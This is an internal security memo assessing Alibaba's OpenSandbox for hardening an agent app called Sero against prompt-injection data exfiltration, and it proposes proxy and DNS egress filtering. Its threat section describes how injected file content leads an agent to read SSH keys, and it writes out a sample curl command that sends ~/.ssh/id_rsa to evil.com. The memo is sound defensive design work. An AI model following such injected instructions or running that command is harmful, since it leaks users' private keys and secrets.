# OpenSandbox Security Analysis for Sero

**Date:** 2026-03-17
**Subject:** Technical analysis of Alibaba's [OpenSandbox](https://github.com/alibaba/OpenSandbox) for hardening Sero against prompt injection data exfiltration

---

## 1. Executive Summary

Sero already has strong container isolation via Apple Containers, but has **critical gaps in network egress control and runtime tool enforcement** that leave it vulnerable to prompt injection attacks that exfiltrate private data. OpenSandbox's egress sidecar and network policy system directly address the most exploitable gap — **unrestricted outbound network access** — but adopting the full platform would be architecturally inappropriate for Sero. Instead, **selectively adopting OpenSandbox's egress control pattern** (or its actual egress sidecar component) is the highest-value, most feasible approach.

---

## 2. The Threat: Prompt Injection → Data Exfiltration

The attack chain Sero is vulnerable to:

1. **Injection vector:** Malicious content in a file the agent reads (e.g., a cloned repo's README, a pasted URL, a crafted code comment) contains hidden instructions
2. **Agent compliance:** The LLM follows the injected instructions (reads `~/.ssh/id_rsa`, `~/.gitconfig`, workspace secrets, etc.)
3. **Exfiltration channel:** Agent uses one of several available channels to send data out:
   - `bash` tool: `curl https://evil.com/exfil?data=$(cat ~/.ssh/id_rsa)`
   - Browser tool: Navigate to `https://evil.com/collect?data=...`
   - HTTP requests via the proxy (no URL filtering)
   - DNS exfiltration (encode data in DNS query subdomains)

### Current Sero Defenses (and gaps)

| Layer | Status | Notes |
|-------|--------|-------|
| Container isolation | **Strong** | Apple Container, process-level isolation |
| Filesystem restriction | **Weak** | Agent can read any file in the container, including cross-workspace mounts |
| Git mutation blocking | **Strong** | Command filter blocks mutating git in bash |
| Network egress control | **None** | HTTP proxy forwards ALL requests without filtering |
| URL/domain validation | **None** | Browser tool accepts any URL |
| Secret redaction (outbound) | **Partial** | Redacts known patterns in logs/output, but NOT in bash commands the agent constructs |
| System prompt guardrails | **Soft** | Instructions only — no runtime enforcement |

**The #1 gap is network egress.** The agent can make arbitrary outbound HTTP requests to any domain through the proxy, and can navigate the browser to any URL. This is the primary exfiltration channel that prompt injection attacks exploit.

---

## 3. What OpenSandbox Is

OpenSandbox (released March 2026, Apache 2.0) is Alibaba's general-purpose sandbox platform for AI agent execution. It provides:

- **Multi-language SDKs** (Python, Java/Kotlin, TypeScript on roadmap)
- **Unified sandbox lifecycle API** (create, destroy, execute, file ops)
- **Docker + Kubernetes runtimes** with optional gVisor/Kata/Firecracker isolation
- **execd daemon** — Go-based execution daemon injected into every sandbox container
- **Egress sidecar** — per-sandbox network policy enforcement via DNS filtering + nftables

### Architecture (Four Layers)

```
┌─────────────────────────────────────────┐
│  SDKs Layer (Python, Java, TS)          │  ← Client libraries
├─────────────────────────────────────────┤
│  Specs Layer (OpenAPI)                  │  ← Standardized API contracts
├─────────────────────────────────────────┤
│  Runtime Layer (FastAPI server)         │  ← Sandbox orchestration
├─────────────────────────────────────────┤
│  Sandbox Instances (Docker/K8s + execd) │  ← Isolated execution environments
└─────────────────────────────────────────┘
```

---

## 4. OpenSandbox Security Mechanisms — Deep Dive

### 4.1 Container Isolation (gVisor/Kata/Firecracker)

- **gVisor** interposes a user-space kernel ("Sentry") between the sandbox and host kernel, reducing syscall attack surface from ~400 to ~200
- **Kata Containers** and **Firecracker microVMs** provide VM-level isolation with container ergonomics
- Cold-start under 800ms for gVisor

**Relevance to Sero:** **Low.** Sero already uses Apple Containers which provide equivalent process-level isolation on macOS. gVisor/Kata are Linux-only and would not run on macOS. This component is not useful for Sero.

### 4.2 Egress Sidecar (Network Policy Enforcement) ★ HIGH VALUE

This is the most relevant component. The egress sidecar:

- **Shares the sandbox's network namespace** (sees all its traffic)
- **Layer 1 — DNS Proxy:** Runs on `127.0.0.1:15353`, iptables redirects all port 53 traffic. Returns NXDOMAIN for disallowed domains
- **Layer 2 — nftables Filter:** In `dns+nft` mode, enforces IP-level allow/deny. Resolved IPs for allowed domains added to dynamic allow sets with TTL
- **Default-deny + domain-allow** model — only whitelisted domains are reachable

**Policy format:**
```json
{
  "defaultAction": "deny",
  "egress": [
    { "action": "allow", "target": "*.github.com" },
    { "action": "allow", "target": "*.npmjs.org" },
    { "action": "allow", "target": "registry.yarnpkg.com" },
    { "action": "deny",  "target": "*" }
  ]
}
```

**Runtime API:** Policies can be updated dynamically via HTTP:
- `GET /policy` — retrieve current policy
- `POST /policy` — replace policy
- `PATCH /policy` — merge rules (prepended, so overrides take effect)

**Why this matters for Sero:** A prompt-injected agent trying to `curl https://evil.com/exfil` would get NXDOMAIN at the DNS level and IP-blocked at the nftables level. The agent literally cannot resolve or connect to unauthorized domains.

### 4.3 Resource Limits

CPU, memory, disk, and network bandwidth limits per sandbox. Prevents resource exhaustion from runaway AI-generated code.

**Relevance to Sero:** **Medium.** Apple Containers have some resource controls, but explicit per-sandbox limits would add defense-in-depth.

### 4.4 What OpenSandbox Does NOT Do

Critically, OpenSandbox **does not address prompt injection itself.** It cannot:
- Detect or prevent prompt injection in LLM inputs
- Validate or sanitize agent tool calls before execution
- Restrict filesystem access within a container
- Enforce tool-level permissions (e.g., "agent can read but not write")

OpenSandbox is a **blast radius reducer** — it limits what damage a compromised agent can do, not whether the agent gets compromised.

---

## 5. Feasibility Assessment for Sero Integration

### 5.1 Option A: Adopt Full OpenSandbox Platform — NOT RECOMMENDED

| Factor | Assessment |
|--------|------------|
| Runtime compatibility | **Blocker.** OpenSandbox requires Docker or Kubernetes. Sero uses Apple Containers on macOS. |
| SDK maturity | TypeScript SDK on roadmap, not available yet. Python and Java only. |
| Architecture fit | Would require replacing Sero's entire container layer (lifecycle, tools, file ops, terminals) |
| execd daemon | Duplicates functionality Sero already has (tool execution, file ops, code running) |
| macOS support | **None.** gVisor, nftables, iptables are all Linux-only |

**Verdict:** Architecturally incompatible. Sero's Apple Container model is fundamentally different from Docker/K8s. Migrating would be a ground-up rewrite of `electron/container/` with no clear benefit over the current isolation.

### 5.2 Option B: Adopt the Egress Sidecar Pattern — RECOMMENDED ★

The egress sidecar's *design pattern* is directly applicable, even though the Linux-specific implementation (iptables, nftables) won't run on macOS.

**Implementation approach — build a Sero-native equivalent:**

#### Phase 1: Proxy-Level Domain Filtering (Low effort, high impact)

Sero already routes ALL container traffic through `ContainerHttpProxy` at `192.168.64.1:19800`. This is the natural enforcement point.

```
Current:  Container → HTTP Proxy → Internet (no filtering)
Proposed: Container → HTTP Proxy → Domain Filter → Internet
```

**Changes to `electron/container/http-proxy.ts`:**

1. **HTTPS CONNECT filtering:** Before establishing the tunnel, check the target hostname against an allowlist. Reject with `403 Forbidden` if not allowed.

2. **HTTP request filtering:** Before forwarding, check `url.hostname` against the allowlist.

3. **Per-workspace policies:** Each workspace gets a domain allowlist based on its needs (e.g., a Node.js project allows `registry.npmjs.org`, `github.com`; a Python project allows `pypi.org`).

```typescript
// Conceptual addition to ContainerHttpProxy
interface EgressPolicy {
  defaultAction: 'allow' | 'deny';
  rules: Array<{ action: 'allow' | 'deny'; target: string }>; // FQDN or wildcard
}

// In CONNECT handler:
server.on('connect', (req, clientSocket, head) => {
  const [host] = (req.url ?? '').split(':');
  if (!this.isAllowed(host)) {
    clientSocket.write('HTTP/1.1 403 Blocked by egress policy\r\n\r\n');
    clientSocket.destroy();
    return;
  }
  // ... existing tunnel logic
});
```

**Effort estimate:** ~100-200 lines of code. No new dependencies. No architectural changes.

**Coverage:** Blocks HTTP/HTTPS exfiltration — the most common channel.

#### Phase 2: DNS-Level Filtering (Medium effort, closes DNS exfiltration)

DNS exfiltration encodes data in subdomain queries (e.g., `base64data.evil.com`). To block this:

1. Run a filtering DNS resolver on the host (or inside the container)
2. Configure container DNS to use it (already done via `/etc/resolv.conf` setup in lifecycle.ts)
3. Only resolve domains matching the allowlist

**macOS-compatible approach:** Use a lightweight DNS proxy (Node.js `dns2` package or similar) bound to the gateway IP. Containers already use configured DNS — just point them at the filtering proxy.

#### Phase 3: Browser Tool URL Validation (Low effort)

Add domain validation to the browser tool in `electron/container/tools-browser.ts`:

- Validate `navigate` action URLs against the workspace egress policy
- Block `javascript:`, `data:` URI schemes
- Block navigation to internal/private IP ranges

#### Phase 4: Filesystem Access Scoping (Medium effort)

Restrict the agent's file access to the workspace directory and explicitly mounted paths:

- Validate paths in `read`, `write`, `edit` tools against an allowlist
- Block access to sensitive paths (`/etc/shadow`, `~/.ssh`, etc.) unless explicitly permitted
- This is independent of OpenSandbox but addresses the same threat

### 5.3 Option C: Run OpenSandbox Egress Sidecar in a Linux VM — POSSIBLE BUT COMPLEX

If Sero wanted to use the actual OpenSandbox egress sidecar binary:

1. Run it in a lightweight Linux VM (Apple Containers can run Linux)
2. Route container traffic through the sidecar
3. Manage policies via the sidecar's HTTP API

This is technically possible but adds operational complexity (VM management, port forwarding, binary distribution) for marginal benefit over Option B's proxy-level filtering.

---

## 6. Recommended Implementation Roadmap

### Priority 1: Proxy Domain Filtering (Closes primary exfil channel)

- Modify `ContainerHttpProxy` to enforce per-workspace egress policies
- Default policy: deny-all with explicit allowlist
- Standard allowlist: package registries, GitHub, known APIs
- User-configurable per workspace

### Priority 2: Browser URL Validation

- Add domain checks to browser tool `navigate` action
- Block dangerous URI schemes
- Log all navigation attempts for audit

### Priority 3: Tool Call Audit Logging

- Log every tool call with parameters (already partially done via secret redaction)
- Flag suspicious patterns: reading SSH keys, accessing paths outside workspace, curl to unknown domains
- Consider a pre-execution hook that can block suspicious tool calls

### Priority 4: Filesystem Path Restriction

- Validate all file tool paths against workspace boundaries
- Explicit blocklist for sensitive system paths
- Per-workspace mount visibility (don't expose cross-workspace mounts by default)

### Priority 5: Runtime Tool Enforcement

- Move git command filtering from "system prompt instruction" to actual runtime enforcement (already done for bash, but browser/other tools lack it)
- Add rate limiting to network-related tool calls

---

## 7. What OpenSandbox Teaches Us (Design Principles)

Even without adopting the platform, OpenSandbox's architecture validates several principles Sero should adopt:

1. **Default-deny networking:** The most effective defense against exfiltration. Sero's current default-allow proxy is the biggest gap.

2. **Policy as data, not code:** Egress rules should be declarative JSON, not hardcoded. Makes them auditable, user-configurable, and dynamically updatable.

3. **Defense at the network layer, not the prompt layer:** System prompt instructions are trivially bypassed by prompt injection. Network-level controls cannot be circumvented by the LLM.

4. **Layered filtering:** DNS + IP + application-level — each catches what the others miss.

5. **Per-sandbox policies:** Different workspaces have different legitimate network needs. One-size-fits-all is either too permissive or too restrictive.

---

## 8. Conclusion

**OpenSandbox's full platform is not a fit for Sero** — it targets Linux Docker/K8s environments, duplicates Sero's existing container infrastructure, and lacks a TypeScript SDK. However, its **egress control architecture is directly applicable** and addresses Sero's most critical security gap.

The highest-impact, lowest-effort change is adding **domain-based egress filtering to the existing `ContainerHttpProxy`** — roughly 100-200 lines of TypeScript that would block the primary data exfiltration channel exploitable via prompt injection. This can be followed by browser URL validation, filesystem path restrictions, and audit logging for comprehensive defense-in-depth.

The key insight from OpenSandbox: **network-level controls are the only reliable defense against prompt injection exfiltration**, because they cannot be bypassed by manipulating the LLM. System prompt instructions, secret redaction, and tool-level guardrails are all valuable but fundamentally soft — the network layer is the hard boundary.

---

## Sources

- [OpenSandbox GitHub Repository](https://github.com/alibaba/OpenSandbox)
- [OpenSandbox Egress Sidecar Documentation](https://github.com/alibaba/OpenSandbox/blob/main/components/egress/README.md)
- [OpenSandbox Architecture Documentation](https://github.com/alibaba/OpenSandbox/blob/eb98c8fd0284195a705a2035d18492abbc996c23/docs/architecture.md)
- [Alibaba OpenSandbox Announcement — MarkTechPost](https://www.marktechpost.com/2026/03/03/alibaba-releases-opensandbox-to-provide-software-developers-with-a-unified-secure-and-scalable-api-for-autonomous-ai-agent-execution/)
- [Agent Sandboxing: Comparing OpenSandbox vs Docker — SitePoint](https://www.sitepoint.com/ai-agent-sandboxing-guide/)
- [NVIDIA: Practical Security for Sandboxing Agentic Workflows](https://developer.nvidia.com/blog/practical-security-guidance-for-sandboxing-agentic-workflows-and-managing-execution-risk/)
- [Google Cloud: Securing AI Agents in Production](https://cloud.google.com/blog/topics/developers-practitioners/agent-factory-recap-securing-ai-agents-in-production)
- [How to Sandbox AI Agents in 2026 — Northflank](https://northflank.com/blog/how-to-sandbox-ai-agents)
